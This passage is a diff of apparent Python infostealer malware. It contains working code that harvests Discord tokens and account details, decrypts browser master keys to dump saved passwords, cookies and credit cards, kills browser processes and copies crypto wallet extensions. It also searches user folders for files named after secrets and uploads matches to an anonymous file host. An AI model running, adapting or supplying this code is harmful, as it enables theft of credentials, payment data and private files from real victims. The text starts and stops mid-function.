-                        if os.path.exists(total_path):
-                            with open(total_path, errors='ignore') as file:
-                                for line in file:
-                                    for token in re.findall(regexp, line.strip()):
-                                        if ValidateToken(token, base_url):
-                                            uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
-                                            if uid not in uids:
-                                                tokens.append(token)
-                                                uids.append(uid)
-                                                token_info[token] = (name, total_path)
-
-            if os.path.exists(os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
-                for path, _, files in os.walk(os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
-                    for _file in files:
-                        if _file.endswith('.sqlite'):
-                            with open(os.path.join(path, _file), errors='ignore') as file:
-                                for line in file:
-                                    for token in re.findall(regexp, line.strip()):
-                                        if ValidateToken(token, base_url):
-                                            uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
-                                            if uid not in uids:
-                                                tokens.append(token)
-                                                uids.append(uid)
-                                                token_info[token] = ('Firefox', os.path.join(path, _file))
-            return tokens, token_info
-
-        def ValidateToken(token, base_url):
-            return requests.get(base_url, headers={'Authorization': token}).status_code == 200
-
-        def DecryptVal(buff, master_key):
-            iv = buff[3:15]
-            payload = buff[15:-16]
-            tag = buff[-16:]
-            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
-            decrypted = cipher.decrypt_and_verify(payload, tag)
-            return decrypted.decode()
-
-        def GetMasterKey(path):
-            if not os.path.exists(path):
-                return None
-            with open(path, "r", encoding="utf-8") as f:
-                local_state = json.load(f)
-            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-            return CryptUnprotectData(master_key, None, None, None, 0)[1]
-
-        tokens, token_info = ExtractToken()
-        
-        if not tokens:
-            file_discord_account = "Discord token bulunamadı."
-
-        for token_d15c0rd in tokens:
-            number_discord_account += 1
-
-            try: api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_d15c0rd}).json()
-            except: api = {"None": "None"}
-
-            u53rn4m3_d15c0rd = api.get('username', "None") + '#' + api.get('discriminator', "None")
-            d15pl4y_n4m3_d15c0rd = api.get('global_name', "None")
-            us3r_1d_d15c0rd = api.get('id', "None")
-            em4i1_d15c0rd = api.get('email', "None")
-            em4il_v3rifi3d_d15c0rd = api.get('verified', "None")
-            ph0n3_d15c0rd = api.get('phone', "None")
-            c0untry_d15c0rd = api.get('locale', "None")
-            mf4_d15c0rd = api.get('mfa_enabled', "None")
-
-            try:
-                if api.get('premium_type', 'None') == 0:
-                    n1tr0_d15c0rd = 'False'
-                elif api.get('premium_type', 'None') == 1:
-                    n1tr0_d15c0rd = 'Nitro Classic'
-                elif api.get('premium_type', 'None') == 2:
-                    n1tr0_d15c0rd = 'Nitro Boosts'
-                elif api.get('premium_type', 'None') == 3:
-                    n1tr0_d15c0rd = 'Nitro Basic'
-                else:
-                    n1tr0_d15c0rd = 'False'
-            except:
-                n1tr0_d15c0rd = "None"
-
-            try: av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.png"
-            except: av4t4r_ur1_d15c0rd = "None"
-
-            try:
-                billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_d15c0rd}).json()
-                if billing_discord:
-                    p4ym3nt_m3th0d5_d15c0rd = []
-
-                    for method in billing_discord:
-                        if method['type'] == 1:
-                            p4ym3nt_m3th0d5_d15c0rd.append('Bank Card')
-                        elif method['type'] == 2:
-                            p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
-                        else:
-                            p4ym3nt_m3th0d5_d15c0rd.append('Other')
-                    p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
-                else:
-                    p4ym3nt_m3th0d5_d15c0rd = "None"
-            except:
-                p4ym3nt_m3th0d5_d15c0rd = "None"
-
-            try:
-                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_d15c0rd}).json()
-                if gift_codes:
-                    codes = []
-                    for g1ft_c0d35_d15c0rd in gift_codes:
-                        name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
-                        g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
-                        data = f"Gift: \"{name}\" Code: \"{g1ft_c0d35_d15c0rd}\""
-                        if len('\n\n'.join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
-                            break
-                        codes.append(data)
-                    if len(codes) > 0:
-                        g1ft_c0d35_d15c0rd = '\n\n'.join(codes)
-                    else:
-                        g1ft_c0d35_d15c0rd = "None"
-                else:
-                    g1ft_c0d35_d15c0rd = "None"
-            except:
-                g1ft_c0d35_d15c0rd = "None"
-        
-            try: software_name, path = token_info.get(token_d15c0rd, ("Unknown", "Unknown"))
-            except: software_name, path = "Unknown", "Unknown"
-
-            file_discord_account = file_discord_account + f"""
-Discord Hesabin °{str(number_discord_account)}:
-- Bulundugu Klasor      : {path}
-- Tarayici             : {software_name}
-- Token                 : {token_d15c0rd}
-- Isim                  : {u53rn4m3_d15c0rd}
-- Takma ad              : {d15pl4y_n4m3_d15c0rd}
-- Id                    : {us3r_1d_d15c0rd}
-- Email                 : {em4i1_d15c0rd}
-- Email Dogrulamasi     : {em4il_v3rifi3d_d15c0rd}
-- Telefon               : {ph0n3_d15c0rd}
-- Nitro                 : {n1tr0_d15c0rd}
-- Dil                   : {c0untry_d15c0rd}
-- Fatura                : {p4ym3nt_m3th0d5_d15c0rd}
-- Hediye kodu           : {g1ft_c0d35_d15c0rd}
-- Profil Resmi          : {av4t4r_ur1_d15c0rd}
-- Iki asamali dogrulama : {mf4_d15c0rd}
-"""
-        zip_file.writestr(f"Discord Hesaplari ({number_discord_account}).txt", file_discord_account)
-
-        return number_discord_account
-
-    @staticmethod
-    def Interesting_Files(zip_file):
-        path_userprofile = Paths().userprofile
-        path_appdata_roaming = Paths().appdata_roaming
-        extensions = ('.txt', '.log', '.ini', '.json', '.xml', '.csv', '.md', '.rtf', '.cfg', '.conf',
-                    '.png', '.jpg', '.jpeg', '.bmp', '.gif', '.tiff', '.svg', '.webp',
-                    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods', '.odp',
-                    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
-                    '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
-                    '.mp3', '.wav', '.aac', '.flac', '.ogg'
-                )
-
-        paths = [
-            os.path.join(path_userprofile, "Desktop"),
-            os.path.join(path_userprofile, "Downloads"),
-            os.path.join(path_userprofile, "Documents"),
-            os.path.join(path_userprofile, "Picture"),
-            os.path.join(path_userprofile, "Video"),
-            os.path.join(path_userprofile, "OneDrive"),
-            os.path.join(path_appdata_roaming, "Microsoft", "Windows", "Recent")
-        ]
-
-        keywords = [
-            "2fa", "mfa", "2step", "otp", "verification", "verif", "verify",
-            "acount", "account", "compte", "identifiant", "login", "conta", "contas",
-            "personnel", "personal", "perso",
-            "banque", "bank", "funds", "fonds", "paypal", "casino", "banco", "saldo",
-            "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
-            "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
-            "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
-            "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords", "senha", "senhas",
-            "data", "donnée", "donnee", "donnees", "details",
-            "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège",
-            "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
-            "identity", "identité", "passport", "passeport", "permis",
-            "pin", "nip",
-            "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille", "db", "database"
-            "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
-            "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
-            "accountdata", "userdata", "logininfo", "seedbackup", "backup", "dados", "documento", "documentos",
-            "WhatsApp", "whatsapp", "Telegram", "telegram"
-        ]
-
-        name_files = []
-
-        for path in paths:
-            for root, dirs, files in os.walk(path):
-                for file in files:
-                    try:
-                        if file.lower().endswith(extensions):
-                            file_name_no_ext = os.path.splitext(file)[0].lower()
-                            for keyword in keywords:
-                                try:
-                                    if keyword.lower() == file_name_no_ext:
-                                        full_path = os.path.join(root, file)
-                                        if os.path.exists(full_path):
-                                            name_files.append(file)
-                                            base_name, ext = os.path.splitext(file)
-                                            with open(full_path, "rb") as f:
-                                                zip_file.writestr(os.path.join("Interesting Files", base_name + f"_{random.randint(1, 9999)}" + ext), f.read())
-                                        break
-                                except:
-                                    pass
-                    except:
-                        pass
-
-        if name_files:
-            number_files = sum(len(phrase.split()) for phrase in name_files)
+def KiwiFolder(pathF, keywords):
+    global KiwiFiles
+    maxfilesperdir = 7
+    i = 0
+    listOfFile = os.listdir(pathF)
+    ffound = []
+    for file in listOfFile:
+        if not os.path.isfile(pathF + "/" + file): return
+        i += 1
+        if i <= maxfilesperdir:
+            url = uploadToAnonfiles(pathF + "/" + file)
+            ffound.append([pathF + "/" + file, url])
         else:
-            number_files = 0
+            break
+    KiwiFiles.append(["folder", pathF + "/", ffound])
 
-        return number_files
-
-    @staticmethod 
-    def Browser_Infos(zip_file, browser_choice):
-        browsers = []
-        number_cards = 0; file_cards = []
-        number_cookies = 0; file_cookies = []
-        number_history = 0; file_history = []
-        number_passwords = 0; file_passwords = []
-        number_downloads = 0; file_downloads = []
-        number_extentions = 0
-
-        path_appdata_local = Paths().appdata_local
-        path_appdata_roaming = Paths().appdata_roaming
-
-        def GetMasterKey(path):
-            if not os.path.exists(path):
-                return None
-
-            try:
-                with open(path, 'r', encoding='utf-8') as f:
-                    local_state = json.load(f)
-
-                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-                master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-                return master_key
-            except:
-                return None
-
-        def Decrypt(buff, master_key):
-            try:
-                iv = buff[3:15]
-                payload = buff[15:-16]
-                tag = buff[-16:]
-                cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv))
-                decryptor = cipher.decryptor()
-                decrypted_pass = decryptor.update(payload) + decryptor.finalize_with_tag(tag)
-                return decrypted_pass.decode()
-            except:
-                return None
-            
-        def GetPasswords(browser, profile_path, master_key):
-            nonlocal number_passwords
-            password_db = os.path.join(profile_path, 'Login Data')
-            if not os.path.exists(password_db):
-                return
-
-            conn = sqlite3.connect(":memory:")
-            disk_conn = sqlite3.connect(password_db)
-            disk_conn.backup(conn)
-            disk_conn.close()
-            cursor = conn.cursor()
-            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-
-            for row in cursor.fetchall():
-                if not row[0] or not row[1] or not row[2]:
-                    continue
-                url =          f"- Url      : {row[0]}"
-                username =     f"  Username : {row[1]}"
-                password =     f"  Password : {Decrypt(row[2], master_key)}"
-                browser_name = f"  Browser  : {browser}"
-                file_passwords.append(f"{url}\n{username}\n{password}\n{browser_name}\n")
-                number_passwords += 1
-
-            conn.close()
-
-        def GetCookies(browser, profile_path, master_key):
-            nonlocal number_cookies
-            cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
-            if not os.path.exists(cookie_db):
-                return
-
-            conn = sqlite3.connect(":memory:")
-            disk_conn = sqlite3.connect(cookie_db)
-            disk_conn.backup(conn)
-            disk_conn.close()
-            cursor = conn.cursor()
-            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
-
-            for row in cursor.fetchall():
-                if not row[0] or not row[1] or not row[2] or not row[3]:
-                    continue
-                url =          f"- Url     : {row[0]}"
-                name =         f"  Name    : {row[1]}"
-                path =         f"  Path    : {row[2]}"
-                cookie =       f"  Cookie  : {Decrypt(row[3], master_key)}"
-                expire =       f"  Expire  : {row[4]}"
-                browser_name = f"  Browser : {browser}"
-                file_cookies.append(f"{url}\n{name}\n{path}\n{cookie}\n{expire}\n{browser_name}\n")
-                number_cookies += 1
-
-            conn.close()
-
-        def GetHistory(browser, profile_path):
-            nonlocal number_history
-            history_db = os.path.join(profile_path, 'History')
-            if not os.path.exists(history_db):
-                return
-            
-            conn = sqlite3.connect(":memory:")
-            disk_conn = sqlite3.connect(history_db)
-            disk_conn.backup(conn)
-            disk_conn.close()
-            cursor = conn.cursor()
-            cursor.execute('SELECT url, title, last_visit_time FROM urls')
-
-            for row in cursor.fetchall():
-                if not row[0] or not row[1] or not row[2]:
-                    continue
-                url =          f"- Url     : {row[0]}"
-                title =        f"  Title   : {row[1]}"
-                time =         f"  Time    : {row[2]}"
-                browser_name = f"  Browser : {browser}"
-                file_history.append(f"{url}\n{title}\n{time}\n{browser_name}\n")
-                number_history += 1
-
-            conn.close()
-        
-        def GetDownloads(browser, profile_path):
-            nonlocal number_downloads
-            downloads_db = os.path.join(profile_path, 'History')
-            if not os.path.exists(downloads_db):
-                return
-
-            conn = sqlite3.connect(":memory:")
-            disk_conn = sqlite3.connect(downloads_db)
-            disk_conn.backup(conn)
-            disk_conn.close()
-            cursor = conn.cursor()
-            cursor.execute('SELECT tab_url, target_path FROM downloads')
-            for row in cursor.fetchall():
-                if not row[0] or not row[1]:
-                    continue
-                path =         f"- Path    : {row[1]}"
-                url =          f"  Url     : {row[0]}"
-                browser_name = f"  Browser : {browser}"
-                file_downloads.append(f"{path}\n{url}\n{browser_name}\n")
-                number_downloads += 1
-
-            conn.close()
-        
-        def GetCards(browser, profile_path, master_key):
-            nonlocal number_cards
-            cards_db = os.path.join(profile_path, 'Web Data')
-            if not os.path.exists(cards_db):
-                return
-
-            conn = sqlite3.connect(":memory:")
-            disk_conn = sqlite3.connect(cards_db)
-            disk_conn.backup(conn)
-            disk_conn.close()
-            cursor = conn.cursor()
-            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
-
-            for row in cursor.fetchall():
-                if not row[0] or not row[1] or not row[2] or not row[3]:
-                    continue
-                name =             f"- Name             : {row[0]}"
-                expiration_month = f"  Expiration Month : {row[1]}"
-                expiration_year =  f"  Expiration Year  : {row[2]}"
-                card_number =      f"  Card Number      : {Decrypt(row[3], master_key)}"
-                date_modified =    f"  Date Modified    : {row[4]}"
-                browser_name =     f"  Browser          : {browser}"
-                file_cards.append(f"{name}\n{expiration_month}\n{expiration_year}\n{card_number}\n{date_modified}\n{browser_name}\n")
-                number_cards += 1
-            
-            conn.close()
-
-        def GetExtentions(zip_file, extensions_names, browser, profile_path):
-            nonlocal number_extentions
-            extensions_path = os.path.join(profile_path, 'Extensions')
-            zip_folder = os.path.join("Extensions", browser)
-
-            if not os.path.exists(extensions_path):
-                return 
-
-            extentions = [item for item in os.listdir(extensions_path) if os.path.isdir(os.path.join(extensions_path, item))]
-            
-            for extention in extentions:
-                if "Temp" in extention:
-                    continue
-                
-                number_extentions += 1
-                extension_found = False
-                
-                for extension_name, extension_folder in extensions_names:
-                    if extention == extension_folder:
-                        extension_found = True
-                        
-                        extension_folder_path = os.path.join(zip_folder, extension_name, extention)
-                        
-                        source_extension_path = os.path.join(extensions_path, extention)
-                        for item in os.listdir(source_extension_path):
-                            item_path = os.path.join(source_extension_path, item)
-                            
-                            if os.path.isdir(item_path):
-                                for dirpath, dirnames, filenames in os.walk(item_path):
-                                    for filename in filenames:
-                                        file_path = os.path.join(dirpath, filename)
-                                        arcname = os.path.relpath(file_path, source_extension_path)
-                                        zip_file.write(file_path, os.path.join(extension_folder_path, arcname))
-                            else:
-                                zip_file.write(item_path, os.path.join(extension_folder_path, item))
-                        break
-
-                if not extension_found:
-                    other_folder_path = os.path.join(zip_folder, "Unknown Extension", extention)
-                    
-                    source_extension_path = os.path.join(extensions_path, extention)
-                    for item in os.listdir(source_extension_path):
-                        item_path = os.path.join(source_extension_path, item)
-                        
-                        if os.path.isdir(item_path):
-                            for dirpath, dirnames, filenames in os.walk(item_path):
-                                for filename in filenames:
-                                    file_path = os.path.join(dirpath, filename)
-                                    arcname = os.path.relpath(file_path, source_extension_path)
-                                    zip_file.write(file_path, os.path.join(other_folder_path, arcname))
-                        else:
-                            zip_file.write(item_path, os.path.join(other_folder_path, item))
-
-        browser_files = [
-            ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
-            ("Google Chrome SxS",      os.path.join(path_appdata_local,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
-            ("Google Chrome Beta",     os.path.join(path_appdata_local,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
-            ("Google Chrome Dev",      os.path.join(path_appdata_local,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
-            ("Google Chrome Unstable", os.path.join(path_appdata_local,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
-            ("Google Chrome Canary",   os.path.join(path_appdata_local,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
-            ("Microsoft Edge",         os.path.join(path_appdata_local,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
-            ("Opera",                  os.path.join(path_appdata_roaming, "Opera Software", "Opera Stable"),                "opera.exe"),
-            ("Opera GX",               os.path.join(path_appdata_roaming, "Opera Software", "Opera GX Stable"),             "opera.exe"),
-            ("Opera Neon",             os.path.join(path_appdata_roaming, "Opera Software", "Opera Neon"),                  "opera.exe"),
-            ("Brave",                  os.path.join(path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
-            ("Vivaldi",                os.path.join(path_appdata_local,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
-            ("Internet Explorer",      os.path.join(path_appdata_local,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
-            ("Amigo",                  os.path.join(path_appdata_local,   "Amigo", "User Data"),                            "amigo.exe"),
-            ("Torch",                  os.path.join(path_appdata_local,   "Torch", "User Data"),                            "torch.exe"),
-            ("Kometa",                 os.path.join(path_appdata_local,   "Kometa", "User Data"),                           "kometa.exe"),
-            ("Orbitum",                os.path.join(path_appdata_local,   "Orbitum", "User Data"),                          "orbitum.exe"),
-            ("Cent Browser",           os.path.join(path_appdata_local,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
-            ("7Star",                  os.path.join(path_appdata_local,   "7Star", "7Star", "User Data"),                   "7star.exe"),
-            ("Sputnik",                os.path.join(path_appdata_local,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
-            ("Epic Privacy Browser",   os.path.join(path_appdata_local,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
-            ("Uran",                   os.path.join(path_appdata_local,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
-            ("Yandex",                 os.path.join(path_appdata_local,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
-            ("Yandex Canary",          os.path.join(path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
-            ("Yandex Developer",       os.path.join(path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
-            ("Yandex Beta",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
-            ("Yandex Tech",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
-            ("Yandex SxS",             os.path.join(path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
-            ("Iridium",                os.path.join(path_appdata_local,   "Iridium", "User Data"),                          "iridium.exe"),
-            ("Safari",                 os.path.join(path_appdata_roaming, "Apple Computer", "Safari"),                      "safari.exe"),
-        ]
-
-        profiles = [
-            '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
-        ]
-
-        extensions_names = [
-            ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
-            ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
-            ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
-            ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
-            ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
-            ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
-            ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
-            ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
-            ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
-            ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
-            ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
-            ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
-            ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
-            ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
-            ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
-            ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
-            ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
-            ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
-            ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
-            ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
-            ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
-            ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
-            ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
-            ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
-            ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
-            ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
-            ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
-            ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
-            ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
-            ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
-            ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
-            ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
-            ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
-            ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
-            ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
-            ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
-            ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
-            ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
-            ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
-            ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
-            ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
-            ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
-            ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
-            ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
-        ]
-        
-        try:
-            for name, path, proc_name in browser_files:
-                for proc in psutil.process_iter(['pid', 'name']):
-                    try:
-                        if proc.name().lower() == proc_name.lower():
-                            proc.kill()
-                    except:
-                        pass
-        except:
-            pass
-
-        for name, path, proc_name in browser_files:
-            if not os.path.exists(path):
-                continue
-
-            master_key = GetMasterKey(os.path.join(path, 'Local State'))
-            print(f"Master key for {name}: {master_key is not None}")
-            if not master_key:
-                continue
-
-            for profile in profiles:
-                profile_path = os.path.join(path, profile)
-                if not os.path.exists(profile_path):
-                    continue
-                
-                if "extentions" in browser_choice:
-                    try:
-                        GetExtentions(zip_file, extensions_names, name, profile_path)
-                    except:
-                        pass
-
-                if "passwords" in browser_choice:
-                    try:
-                        GetPasswords(name, profile_path, master_key)
-                    except:
-                        pass
-
-                if "cookies" in browser_choice:
-                    try:
-                        GetCookies(name, profile_path, master_key)
-                    except:
-                        pass
-
-                if "history" in browser_choice:
-                    try:
-                        GetHistory(name, profile_path)
-                    except:
-                        pass
-
-                if "downloads" in browser_choice:
-                    try:
-                        GetDownloads(name, profile_path)
-                    except:
-                        pass
-
-                if "cards" in browser_choice:
-                    try:
-                        GetCards(name, profile_path, master_key)
-                    except:
-                        pass
-
-                if name not in browsers:
-                    browsers.append(name)
-
-        if "passwords" in browser_choice:
-            if not file_passwords:
-                file_passwords.append("No passwords was saved on the victim's computer.")
-            file_passwords = "\n".join(file_passwords)
-
-        if "cookies" in browser_choice:
-            if not file_cookies:
-                file_cookies.append("No cookies was saved on the victim's computer.")
-            file_cookies   = "\n".join(file_cookies)
-
-        if "history" in browser_choice:
-            if not file_history:
-                file_history.append("No history was saved on the victim's computer.")
-            file_history   = "\n".join(file_history)
-
-        if "downloads" in browser_choice:
-            if not file_downloads:
-                file_downloads.append("No downloads was saved on the victim's computer.")
-            file_downloads = "\n".join(file_downloads)
-
-        if "cards" in browser_choice:
-            if not file_cards:
-                file_cards.append("No cards was saved on the victim's computer.")
-            file_cards     = "\n".join(file_cards)
-        
-        if number_passwords != None:
-            zip_file.writestr(f"Sifreler ({number_passwords}).txt", file_passwords)
-
-        if number_cookies != None:
-            zip_file.writestr(f"Cookies ({number_cookies}).txt", file_cookies)
-
-        if number_cards != None:
-            zip_file.writestr(f"Cards ({number_cards}).txt", file_cards)
-
-        if number_history != None:
-            zip_file.writestr(f"Browsing History ({number_history}).txt", file_history)
-
-        if number_downloads != None:
-            zip_file.writestr(f"Download History ({number_downloads}).txt",file_downloads)
-
-        return number_extentions, number_passwords, number_cookies, number_history, number_downloads, number_cards
-
-    @staticmethod
-    def AntiVirus_Infos(zip_file):
-        path_program_files = Paths().program_files
-        path_program_files_x86 = Paths().program_files_x86
-        antivirus_list = [
-            "Avast Antivirus",
-            "AVG Antivirus",
-            "Avira Antivirus",
-            "Bitdefender Antivirus",
-            "Kaspersky Antivirus",
-            "McAfee Antivirus",
-            "Norton Antivirus",
-            "ESET NOD32 Antivirus",
-            "Trend Micro Antivirus",
-            "Windows Defender",
-            "Malwarebytes",
-            "Sophos Home",
-            "Panda Dome",
-            "F-Secure SAFE",
-            "Webroot SecureAnywhere",
-            "BullGuard Antivirus",
-            "ZoneAlarm Free Antivirus",
-            "Adaware Antivirus",
-            "Comodo Antivirus",
-            "360 Total Security"
-        ]
-
-        found_antivirus = []
-
-        for antivirus in antivirus_list:
-            paths_to_check = [
-                os.path.join(path_program_files, antivirus),
-                os.path.join(path_program_files_x86, antivirus)
-            ]
-            for path in paths_to_check:
-                if os.path.exists(path):
-                    found_antivirus.append(antivirus)
+KiwiFiles = []
+def KiwiFile(path, keywords):
+    global KiwiFiles
+    fifound = []
+    listOfFile = os.listdir(path)
+    for file in listOfFile:
+        for worf in keywords:
+            if worf in file.lower():
+                if os.path.isfile(path + "/" + file) and ".txt" in file:
+                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
+                    break
+                if os.path.isdir(path + "/" + file):
+                    target = path + "/" + file
+                    KiwiFolder(target, keywords)
                     break
 
-        if found_antivirus:
-            antivirus_info = "Antivirus bulundu:\n- " + "\n- ".join(found_antivirus)
-        else:
-            antivirus_info = "Sistemde antivirus bulunumadı."
+    KiwiFiles.append(["folder", path, fifound])
 
-        zip_file.writestr("Antivirus Bilgisi.txt", antivirus_info)
+def Kiwi():
+    user = temp.split("\AppData")[0]
+    path2search = [
+        user + "/Desktop",
+        user + "/Downloads",
+        user + "/Documents"
+    ]
 
-        return len(found_antivirus)
+    key_wordsFolder = [
+        "account",
+        "acount",
+        "passw",
+        "secret",
+        "senhas",
+        "contas",
+        "backup",
+        "2fa",
+        "importante",
+        "privado",
+        "exodus",
+        "exposed",
+        "perder",
+        "amigos",
+        "empresa",
+        "trabalho",
+        "work",
+        "private",
+        "source",
+        "users",
+        "username",
+        "login",
+        "user",
+        "usuario",
+        "log"
+    ]
 
-    @staticmethod
-    def Session_files(zip_file, session_files_choice):
-        path_appdata_roaming   = Paths().appdata_roaming
-        path_appdata_local     = Paths().appdata_local
-        path_program_files = Paths().program_files
-
-        name_game_launchers  = [] if "Game Launchers" in session_files_choice else None
-        name_wallets         = [] if "Wallets" in session_files_choice else None
-        name_apps            = [] if "Apps" in session_files_choice else None
-
-        session_files = [
-            ("Zcash",             os.path.join(path_appdata_roaming,   "Zcash"),                                                      "zcash.exe",             "Wallets"),
-            ("Armory",            os.path.join(path_appdata_roaming,   "Armory"),                                                     "armory.exe",            "Wallets"),
-            ("Bytecoin",          os.path.join(path_appdata_roaming,   "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
-            ("Guarda",            os.path.join(path_appdata_roaming,   "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
-            ("Atomic Wallet",     os.path.join(path_appdata_roaming,   "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
